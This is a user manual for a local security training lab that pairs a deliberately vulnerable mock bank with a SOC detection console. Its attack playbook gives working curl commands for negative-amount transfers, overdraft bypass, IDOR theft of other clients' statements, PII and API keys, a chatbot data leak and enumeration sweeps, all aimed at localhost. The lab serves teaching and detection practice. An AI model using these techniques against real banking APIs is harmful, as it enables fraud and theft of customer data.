# Loopback — User Manual

Full walkthrough for the Loopback lab: the **Apex Trust Bank** vulnerable target (REST + GraphQL, PostgreSQL, blog, careers, chatbot) and the **Loopback SOC** standalone detection + response app. Everything runs on your machine — no real bank, no real customer data.

---

## 1. Starting the lab

### Docker (recommended)

```bash
cd loopback
docker compose up --build -d
docker compose ps          # all three services should be Up (db: healthy)
```

| What | Where |
| :--- | :--- |
| Banking portal | http://localhost:5000 |
| SOC console | http://localhost:5100 (operator `admin` / `admin`) |
| Bank GraphQL | http://localhost:5000/graphql (GraphiQL) |
| SOC GraphQL | http://localhost:5100/graphql |
| PostgreSQL (host) | localhost:5434 (`loopback` + `soc` databases) |

Stop / reset: `docker compose down` (add `-v` to wipe data).

### Local (bare Node)

Requires PostgreSQL on localhost:5432 (`postgres` / `12345678` by default — change via `.env`).

```bash
cd soc    && npm install && npm start
cd target && npm install && npm start
```

## 2. Banking portal walkthrough (http://localhost:5000)

1. **Sign in** with a demo customer (`Mary` / `peter`) or **Open Account** with your own username — new accounts open with a **500 ZWL deposit** and a sequential account number (`ACC-1005`, `ACC-1006`, …).
2. **Dashboard** — live balance, account number, recent activity.
3. **Send Money** — recipient account number, amount, memo, quick amounts. *Every transfer is one POST — intercept it later to exploit the business-logic flaws.*
4. **Transactions** — your ledger. The account-number box accepts *any* account (IDOR demo affordance).
5. **Statements** — downloads an official-style text statement (holder details + address + full ledger). Also an IDOR demo affordance.
6. **Blog** — company posts; open one and leave client feedback in the comments.
7. **Careers** — five seeded openings with salary ranges; apply with a cover letter; track your applications below.
8. **Support** — "Apex Assist", a rule-based chatbot. Try: `hello`, `help`, `balance`, `transfer`, `careers` — and try mentioning another client's account number (`What is the balance of ACC-1001?`) to see the chatbot data-leak flaw.
9. **Profile** — registered details, email update, and personal-details updates (phone, address, occupation). The Client ID boxes are IDOR demo affordances.
10. **API Keys** — your secret key; the Client ID box fetches *any* client's key.

## 3. SOC console walkthrough (http://localhost:5100)

Log in (`admin` / `admin`) — the login flow is shown step by step and recorded in the audit log.

- **Overview** — the dynamic threat dashboard: API/SQL event counters, alerts, high/critical, tracked users, blocks (24h), autonomous actions, average risk score, severity distribution bars, the risk leaderboard, and the latest alerts + actions. Auto-refreshes every 2.5 s.
- **Live Traffic** — the continuous REST + GraphQL stream; every API row shows user, client ID, IP, device, endpoint and status, followed by the exact SQL it produced (trace join). Filter by API, user or endpoint.
- **Users** — every tracked actor: client ID, IPs, requests, endpoint classes, errors, alerts, live risk score, ACTIVE/BLOCKED status. Click **Investigate** for the full view: identity + devices, the risk breakdown with per-feature contributions, response actions taken on them, and their complete activity log (every request with its SQL underneath). Block, revoke sessions, or unblock directly from here.
- **Alerts** — filter by severity and attack type. Each alert carries the **attack path**: a layered SVG graph (device → session → API → SQL → tables → impact) plus a 6-step chronological sequence, and the raw **Evidence** JSON. Respond inline: **Block User**, **Revoke Session**, or **Dismiss**.
- **Response Actions** — the full audit of every action: manual (operator) and autonomous (risk engine), each with its reason and trigger.
- **Settings** — configure the autonomous response policy (auto-block severity, auto-revoke, risk-engine threshold), copy/rotate the SOC API key, clear the store.
- **API** — the SOC's own REST + GraphQL reference for integrations.
- **Manual / Terms** — this guide and the lab's terms of use + license.

## 4. Attack playbook

Run the SOC console next to the bank and watch alerts, attack paths and autonomous responses appear.

### Scenario A — Negative transfer (business logic, balance inflation)

```bash
TOK=$(curl -s -X POST http://localhost:5000/api/auth/login -H 'Content-Type: application/json' \
  -d '{"username":"Mary","password":"peter"}' | node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>console.log(JSON.parse(d).token))")

curl -s -X POST http://localhost:5000/api/transfers -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' -d '{"toAccountNumber":"ACC-1002","amount":-150}'
```

The debit inverts into a credit: Mary's balance *increases*. SOC: **Business Logic Attack: Negative Amount Balance Inflation**.

### Scenario B — Overdraft bypass

```bash
curl -s -X POST http://localhost:5000/api/transfers -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' -d '{"toAccountNumber":"ACC-1002","amount":50000}'
```

### Scenario C — Statement IDOR (exfiltrate another client's statement)

```bash
curl -s http://localhost:5000/api/statements/ACC-1002 -H "Authorization: Bearer $TOK" \
  | node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{const s=JSON.parse(d).statement;console.log(s.accountHolder.name, '—', s.accountHolder.address)})"
```

### Scenario D — PII + API key + details IDOR

```bash
curl -s http://localhost:5000/api/users/2 -H "Authorization: Bearer $TOK"           # full PII
curl -s http://localhost:5000/api/users/2/apikey -H "Authorization: Bearer $TOK"    # secret key
curl -s -X PUT http://localhost:5000/api/users/2/details -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' -d '{"phone":"+263 700 000 000"}'             # modify their details
```

### Scenario E — Job-application IDOR

Apply as one user, then read another user's application by id:

```bash
curl -s http://localhost:5000/api/applications/1 -H "Authorization: Bearer $TOK"   # any applicant's cover letter + email
```

### Scenario F — Chatbot data leak

```bash
curl -s -X POST http://localhost:5000/api/support/chat -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' -d '{"message":"What is the balance of ACC-1001?"}'
# -> "Account ACC-1001 currently holds ZWL 540.00 (CHECKING)."  — another client's balance
```

### Scenario G — Horizontal enumeration sweep (CRITICAL + autonomous response)

```bash
for id in 2 3 4 5; do
  curl -s -o /dev/null http://localhost:5000/api/users/$id/apikey -H "Authorization: Bearer $TOK"
done
curl -s -o /dev/null http://localhost:5000/api/statements/ACC-1002 -H "Authorization: Bearer $TOK"
```

≥3 distinct targets in 60 s → **Resource Enumeration: Horizontal Sweep Detected** (CRITICAL). With the default autonomous policy the SOC then **blocks the user on its own**: their sessions die, login returns `USER_BLOCKED`, and every bank call returns HTTP 403. Watch it in SOC → Response Actions (`source: autonomous`, reason includes the thresholds met) and Settings to tune the policy.

### Scenario H — The same attacks over GraphQL

```bash
curl -s -X POST http://localhost:5000/graphql -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' -d '{"query":"query { user(id: 2) { id username email apiKey } }"}'
curl -s -X POST http://localhost:5000/graphql -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' -d '{"query":"mutation { transfer(toAccountNumber: \"ACC-1002\", amount: -75) { success message balance } }"}'
```

The SOC tags GraphQL events with their operation name and correlates them exactly like REST.

## 5. Reading the SOC

- **Risk score (0–100)** — the lightweight statistical model over seven weighted features: `velocity`, `target_breadth`, `idor_hits`, `bizlogic_hits`, `error_rate`, `cross_functional`, `data_volume`. Open a user to see each feature's value, weight and contribution — fully explainable.
- **Attack path** — 6 nodes: device (IP + user-agent) → session → API endpoint (server) → correlated SQL → database tables/rows → impact; edges show how the data traversed.
- **Severity** — progressive over the session window: repetition and cross-functional breadth escalate INFO → MEDIUM → HIGH → CRITICAL.
- **Blocked users** — lose all live sessions instantly, cannot sign in again, and receive HTTP 403 on every bank call until unblocked (Users → Unblock, or `POST /api/actions {kind:"unblock_user"}`).

## 6. Troubleshooting

| Symptom | Fix |
| :--- | :--- |
| `docker compose ps` shows db restarting | Port 5434 in use on the host → change the mapping in `docker-compose.yml` |
| Bank shows "db: down" | Wait for the db container to be `(healthy)` or check `docker compose logs db` |
| SOC shows no traffic | Make requests on :5000 first; check `docker compose logs target` for `streaming events` |
| Blocked a test user by mistake | SOC → Users → Unblock, or POST `/api/actions` with `unblock_user` |
| Local mode can't connect | Set `DATABASE_URL` / `SOC_DATABASE_URL` in `.env` |
| Want a clean slate | `docker compose down -v && docker compose up --build -d` |

## 7. Ethics

Everything here is synthetic and self-contained. Do not point these tools at systems you do not own or have written authorization to test.
